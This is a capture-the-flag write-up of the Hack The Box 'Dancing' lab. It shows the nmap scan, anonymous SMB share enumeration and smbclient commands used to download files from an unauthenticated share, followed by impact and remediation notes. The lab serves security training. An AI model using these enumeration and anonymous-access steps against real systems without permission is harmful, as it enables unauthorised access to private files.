# Dancing - Hack The Box

## Reconnaissance

- VPN connection established using OpenVPN
- Target reachable via ping

```bash
ping <target_IP>
```

- Nmap scan performed:

```bash
nmap -sV <target_IP>
```

### Result

- Port 445 open → SMB service

---

## Enumeration

- Attempt to list available SMB shares:

```bash
smbclient -L //<target_IP> -U ""
```

- Discovered share: `WorkShares`

---

## Exploitation

- Connect to the SMB share:

```bash
smbclient //<target_IP>/WorkShares -U ""
```

- No authentication required (anonymous access)

---

## Post-Exploitation

- List files:

```bash
ls
```

- Navigate to directories and retrieve files:

```bash
cd Amy.J
get worknotes.txt
```

```bash
cd ../James.P
get flag.txt
```

- Exit SMB session:

```bash
exit
```

- Read the flag:

```bash
cat flag.txt
```

---

## Vulnerability

The SMB share allows anonymous access without authentication.

---

## Impact

- Unauthorized access to internal shared files
- Exposure of sensitive information
- Potential for further lateral movement

---

## Remediation

- Disable anonymous SMB access
- Enforce authentication and access control
- Restrict share permissions
- Monitor SMB access logs

---

## Skills Demonstrated

- Service enumeration with Nmap
- SMB share enumeration
- Anonymous access exploitation
- File extraction from network shares
